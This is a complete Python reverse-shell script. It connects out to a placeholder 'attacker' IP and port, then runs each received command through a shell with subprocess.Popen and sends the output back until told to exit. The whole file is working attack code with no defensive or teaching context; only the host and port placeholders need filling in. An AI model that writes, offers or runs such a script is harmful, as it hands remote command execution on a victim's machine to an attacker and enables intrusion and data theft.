import socket
import subprocess

# Replace the following values with your own IP address and port number
HOST = 'your_ip_address'
PORT = your_port_number

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to the attacker's machine
    s.connect((HOST, PORT))

    while True:
        # Receive the command from the attacker
        command = s.recv(1024).decode()

        if command.lower() == 'exit':
            break

        # Execute the command and retrieve the output
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  stdin=subprocess.PIPE)

        # Send the output back to the attacker
        s.send(output.stdout.read())
        s.send(output.stderr.read())

except socket.error as e:
    print(f"Socket error: {str(e)}")

finally:
    # Close the connection
    s.close()
